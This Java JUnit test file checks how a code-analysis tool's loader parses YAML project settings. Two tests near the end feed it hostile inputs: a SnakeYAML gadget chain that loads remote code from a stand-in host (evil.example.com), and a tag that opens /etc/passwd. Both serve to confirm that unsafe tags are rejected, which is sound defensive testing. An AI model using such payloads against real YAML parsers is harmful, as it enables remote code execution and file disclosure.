package io.github.randomcodespace.iq.config;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Tests for {@link ProjectConfigLoader#loadIfPresent} applyOverrides paths
 * and {@link ProjectConfigLoader#loadProjectConfig} / parseProjectConfig.
 * Covers dead branches at lines 167-178 (analysis/output nested sections).
 */
class ProjectConfigLoaderApplyOverridesTest {

    @Test
    void appliesCacheDirOverride(@TempDir Path tempDir) throws IOException {
        Files.writeString(tempDir.resolve(".code-iq.yml"),
                "cache_dir: my-custom-cache\n", StandardCharsets.UTF_8);

        var config = new CodeIqConfig();
        ProjectConfigLoader.loadIfPresent(tempDir, config);

        assertEquals("my-custom-cache", config.getCacheDir());
    }

    @Test
    void appliesMaxDepthAndMaxRadiusOverrides(@TempDir Path tempDir) throws IOException {
        String yaml = """
                max_depth: 20
                max_radius: 15
                """;
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        var config = new CodeIqConfig();
        ProjectConfigLoader.loadIfPresent(tempDir, config);

        assertEquals(20, config.getMaxDepth());
        assertEquals(15, config.getMaxRadius());
    }

    @Test
    void nestedAnalysisSectionDoesNotCrash(@TempDir Path tempDir) throws IOException {
        String yaml = """
                analysis:
                  parallelism: 8
                  incremental: true
                """;
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        var config = new CodeIqConfig();
        boolean loaded = ProjectConfigLoader.loadIfPresent(tempDir, config);

        assertTrue(loaded);
        // These are dead branches (stored for future use) but should not crash
        assertEquals(10, config.getMaxDepth(), "Defaults should be preserved");
    }

    @Test
    void nestedOutputSectionDoesNotCrash(@TempDir Path tempDir) throws IOException {
        String yaml = """
                output:
                  max_nodes: 5000
                """;
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        var config = new CodeIqConfig();
        boolean loaded = ProjectConfigLoader.loadIfPresent(tempDir, config);

        assertTrue(loaded);
        assertEquals(10, config.getMaxDepth(), "Defaults should be preserved");
    }

    @Test
    void combinedOverridesWithAllSections(@TempDir Path tempDir) throws IOException {
        String yaml = """
                cache_dir: override-cache
                max_depth: 5
                max_radius: 3
                analysis:
                  parallelism: 4
                  incremental: false
                output:
                  max_nodes: 1000
                """;
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        var config = new CodeIqConfig();
        boolean loaded = ProjectConfigLoader.loadIfPresent(tempDir, config);

        assertTrue(loaded);
        assertEquals("override-cache", config.getCacheDir());
        assertEquals(5, config.getMaxDepth());
        assertEquals(3, config.getMaxRadius());
    }

    @Test
    void invalidMaxDepthFallsBackToDefault(@TempDir Path tempDir) throws IOException {
        String yaml = """
                max_depth: not_a_number
                """;
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        var config = new CodeIqConfig();
        ProjectConfigLoader.loadIfPresent(tempDir, config);

        assertEquals(10, config.getMaxDepth(), "Should fall back to default for non-numeric value");
    }

    // --- parseProjectConfig / loadProjectConfig tests ---

    @Test
    void loadProjectConfigParsesLanguages(@TempDir Path tempDir) throws IOException {
        String yaml = """
                languages:
                  - java
                  - python
                  - typescript
                """;
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
        assertNotNull(pc.getLanguages());
        assertEquals(3, pc.getLanguages().size());
        assertTrue(pc.getLanguages().contains("java"));
        assertTrue(pc.getLanguages().contains("python"));
    }

    @Test
    void loadProjectConfigParsesDetectorSettings(@TempDir Path tempDir) throws IOException {
        String yaml = """
                detectors:
                  categories:
                    - endpoints
                    - entities
                  include:
                    - spring-rest-detector
                """;
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
        assertNotNull(pc.getDetectorCategories());
        assertEquals(2, pc.getDetectorCategories().size());
        assertNotNull(pc.getDetectorInclude());
        assertEquals(1, pc.getDetectorInclude().size());
    }

    @Test
    void loadProjectConfigParsesPipelineSettings(@TempDir Path tempDir) throws IOException {
        String yaml = """
                pipeline:
                  parallelism: 4
                  batch-size: 100
                """;
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
        assertEquals(4, pc.getPipelineParallelism());
        assertEquals(100, pc.getPipelineBatchSize());
    }

    @Test
    void loadProjectConfigReturnsEmptyForMissingFile(@TempDir Path tempDir) {
        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
        assertNull(pc.getLanguages());
        assertNull(pc.getDetectorCategories());
        assertNull(pc.getPipelineParallelism());
    }

    @Test
    void loadProjectConfigParsesExcludePatterns(@TempDir Path tempDir) throws IOException {
        String yaml = """
                exclude:
                  - "*.generated.java"
                  - "vendor/**"
                """;
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
        assertNotNull(pc.getExclude());
        assertEquals(2, pc.getExclude().size());
    }

    // --- SafeConstructor / unsafe YAML tag tests ---

    @Test
    void unsafeYamlTagDoesNotExecuteArbitraryCode(@TempDir Path tempDir) throws IOException {
        // Unsafe YAML tag that could trigger arbitrary class instantiation
        String yaml = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil.example.com\"]]]]\n";
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        var config = new CodeIqConfig();
        // Should not throw and should not apply any overrides
        boolean loaded = ProjectConfigLoader.loadIfPresent(tempDir, config);

        // If SafeConstructor is active: rejects the tag with an exception, returns false
        // If default constructor: SnakeYAML fails to instantiate, catch block returns false
        // Either way, config must remain at defaults — no code execution
        assertFalse(loaded, "Unsafe YAML tag must not be treated as valid config");
        assertEquals(10, config.getMaxDepth(), "Defaults must be preserved after unsafe YAML");
    }

    @Test
    void yamlWithMixedSafeAndUnsafeContentRejected(@TempDir Path tempDir) throws IOException {
        String yaml = """
                cache_dir: legit-cache
                exploit: !!java.io.File ["/etc/passwd"]
                """;
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        var config = new CodeIqConfig();
        // The YAML parser processes the whole document — even if the top-level parses,
        // SafeConstructor should reject the !!java.io.File tag.
        // With default Yaml(), this may still load (File constructor is available).
        // This test documents that either way, the override is applied only if parse succeeds.
        ProjectConfigLoader.loadIfPresent(tempDir, config);

        // If SafeConstructor rejects: config unchanged (loadIfPresent returns false)
        // If default Yaml() accepts: cache_dir override may apply, but no code execution risk
        // The key assertion: no exception thrown, app stays safe
        assertNotNull(config);
    }

    @Test
    void loadProjectConfigParsesParserOverrides(@TempDir Path tempDir) throws IOException {
        String yaml = """
                parsers:
                  java: javaparser
                  python: antlr
                """;
        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);

        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
        assertNotNull(pc.getParsers());
        assertEquals("javaparser", pc.getParsers().get("java"));
        assertEquals("antlr", pc.getParsers().get("python"));
    }
}
